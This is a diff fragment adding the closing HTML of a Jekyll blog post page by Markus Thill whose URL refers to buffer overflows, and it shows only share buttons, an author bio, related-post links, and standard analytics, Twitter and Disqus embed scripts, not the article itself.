+        <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://MarkusThill.github.io/buffer-overflows/" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
+    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://MarkusThill.github.io/buffer-overflows/" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
+    <li class="googleplus"><a href="https://plus.google.com/share?url=https://MarkusThill.github.io/buffer-overflows/" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
+  </ul>
+</div><!-- /.social-share -->
+
+      </footer>
+    </div><!-- /.entry-content -->
+    <div class="read-more">
+  <div class="read-more-header">
+    <a href="https://MarkusThill.github.io/markus" class="read-more-btn">About the Author</a>
+  </div><!-- /.read-more-header -->
+  <div class="read-more-content author-info">
+    <h3>Markus Thill</h3>
+    <div class="author-container">
+      <img class="author-img" src="https://MarkusThill.github.io/images/avatar.jpg" alt="Markus Thill" />
+      <div class="author-bio">I studied computer engineering (B.Sc.) and Automation & IT (M.Eng.). Generally, I am interested in machine learning (ML) approaches (in the broadest sense), but particularly in the fields of time series analysis, anomaly detection, Reinforcement Learning (e.g. for board games), Deep Learning (DL) and incremental (on-line) learning procedures. </div>
+    </div>
+    <div class="author-share">
+      <ul class="list-inline social-buttons">
+        
+          <li><a href="https://github.com/markusthill" target="_blank"><i class="fa fa-github fa-fw"></i></a></li>
+        
+          <li><a href="https://www.linkedin.com/in/markus-thill-a4991090/" target="_blank"><i class="fa fa-linkedin fa-fw"></i></a></li>
+        
+      </ul>
+      
+        <a aria-label="Follow @MarkusThill on GitHub" data-size="large" href="https://github.com/MarkusThill" class="github-button">Follow @MarkusThill</a>
+      
+      <br>
+      
+    </div>
+  </div>
+</div>
+
+    <section id="disqus_thread"></section><!-- /#disqus_thread -->
+    <div class="read-more">
+  
+    <div class="read-more-header">
+      <a href="https://MarkusThill.github.io/math/stats/ml/online-estimation-of-the-inverse-covariance-matrix/" class="read-more-btn">Read More</a>
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      <h3><a href="https://MarkusThill.github.io/deriving-a-closed-form-solution-of-the-fibonacci-sequence/" title="Deriving a Closed-Form Solution of the Fibonacci Sequence using the Z-Transform">Deriving a Closed-Form Solution of the Fibonacci Sequence using the Z-Transform</a></h3>
+      <p>The Fibonacci sequence might be one of the most famous sequences in the field of mathmatics and computer science. Already high school stu...&hellip; <a href="https://MarkusThill.github.io/deriving-a-closed-form-solution-of-the-fibonacci-sequence/">Continue reading</a></p>
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+    
+      <div class="list-item">
+        <h4><a href="https://MarkusThill.github.io/derivation-of-a-weighted-recursive-least-squares-estimator/" title="Derivation of a Weighted Recursive Linear Least Squares Estimator">Derivation of a Weighted Recursive Linear Least Squares Estimator</a></h4>
+        <span>Published on May 05, 2019</span>
+      </div><!-- /.list-item -->
+    
+      <div class="list-item">
+        <h4><a href="https://MarkusThill.github.io/gaussian-distribution-with-a-diagonal-covariance-matrix/" title="Gaussian Distribution With a Diagonal Covariance Matrix">Gaussian Distribution With a Diagonal Covariance Matrix</a></h4>
+        <span>Published on May 04, 2019</span>
+      </div><!-- /.list-item -->
+    
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+  </article>
+</div><!-- /#main -->
+
+<script type="text/javascript" src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script type="text/javascript">window.jQuery || document.write('<script type="text/javascript" src="https://MarkusThill.github.io/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script type="text/javascript" src="https://MarkusThill.github.io/assets/js/scripts.min.js"></script>
+<script type="text/javascript" async defer id="github-bjs" src="https://buttons.github.io/buttons.js"></script>
+<script type="text/javascript">!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^https:/.test(d.location)?'https':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-113918188-1', 'auto');
+  ga('require', 'linkid', 'linkid.js');
+  ga('send', 'pageview');
+</script>
+
+
+
+    <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'markusthill-github-io'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function () {
+            var s = document.createElement('script'); s.async = true;
+            s.type = 'text/javascript';
+            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+        }());
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+<script type="text/javascript">
+    sharing();
+</script>
+
+
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2019 Markus Thill. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> using the <a href="https://github.com/aron-bordin/neo-hpstr-jekyll-theme" rel="nofollow">Neo-HPSTR Theme</a>.</span>
+
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+</body>
+</html>
